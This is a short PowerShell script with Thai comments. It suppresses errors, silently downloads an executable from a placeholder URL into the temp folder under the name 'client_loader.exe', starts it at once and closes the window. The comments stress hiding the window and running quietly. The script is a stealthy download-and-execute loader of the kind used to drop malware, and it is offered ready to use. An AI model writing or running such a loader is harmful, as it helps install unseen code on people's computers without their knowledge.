# 1. สั่งซ่อนหน้าต่าง PowerShell ทันที (ถ้าเรียกผ่านวิธีอื่น) 
# และตั้งค่าให้ทำงานเงียบๆ
$ErrorActionPreference = "SilentlyContinue"

# 2. ใส่ลิงก์ไฟล์โปรแกรมที่คุณต้องการจะรัน (ตัวอย่างเช่น .exe หรือสคริปต์อื่น)
$url = "https://ลิงก์ไฟล์ของคุณ/program.exe"
$dest = "$env:TEMP\client_loader.exe"

# 3. ทำการดาวน์โหลดเบื้องหลัง (ไม่มีหน้าจอความคืบหน้า)
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

# 4. สั่งรันไฟล์ที่โหลดมาทันที โดยไม่ต้องรอให้รันเสร็จ (Background)
if (Test-Path $dest) {
    Start-Process -FilePath $dest
}

# 5. สั่งปิดหน้าจอ PowerShell ทันที (ทำให้หน้าสีน้ำเงินหายไป)
exit
